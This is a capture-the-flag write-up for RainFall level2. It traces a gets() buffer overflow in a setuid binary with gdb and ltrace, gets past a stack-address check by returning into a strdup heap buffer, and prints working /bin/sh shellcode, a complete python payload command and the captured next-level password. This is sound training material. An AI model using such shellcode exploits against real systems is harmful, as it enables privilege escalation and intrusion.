level2
======

*	We spawn with a [level2](src/level2) executable
	```console
	level2@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
	level2@RainFall:~$ ./level2 
	█
	```
*	Let's take a look at the code in gdb
	```gdb
	(gdb) info functions
	All defined functions:
	...
	0x080484d4  p
	0x0804853f  main
	...
	```
*	We can see two functions : `p` and `main`
	-	`main` is just calling `p`
	-	`p` is a bit more complicated :
		-	declares an array of `76` char
		-	`gets` in this array
		-	protect the return addressand uses `printf` 
		-	uses `puts` and `strdup` on our array
*	Let's try overflowing the buffer
	```console
	(gdb) r
	Starting program: /home/user/level2/level2 
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7A

	Program received signal SIGSEGV, Segmentation fault.
	0x37634136 in ?? ()
	```
	we found out that the offset of `$eip` is equal to `80`
*	It is nice to have a weakness in the code and the offset but there is nothing to exploit inside of it. So we need to use a shellcode to execute `/bin/sh`.
*	Crafting the payload :
	-	buffer = 80 bytes
	-	shellcode (`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`) = 23 bytes
	-	return address = 4 bytes
*	But of course it is never that easy, so this time it seems that there is `cmp` to make sure we don't overwrite the return address within a certain range
	```assembly
	and    $0xb0000000,%eax
	cmp    $0xb0000000,%eax
	```
	Basically, it restrict anything that starts with `0xb` to make sure we don't use the stack
*	So we need to use the heap !
	```console
	level2@RainFall:~$ ltrace ./level2 
	...
	strdup("")                                                                                = 0x0804a008
	...
	```
	this allow us to retrieve the return address of `strdup` -> `\x08\xa0\x04\x08`
*	We tried this
	```console
	level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"' > /tmp/payload
	level2@RainFall:~$ cat /tmp/payload - | ./level2 
	whoami
	level3
	cat /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
	```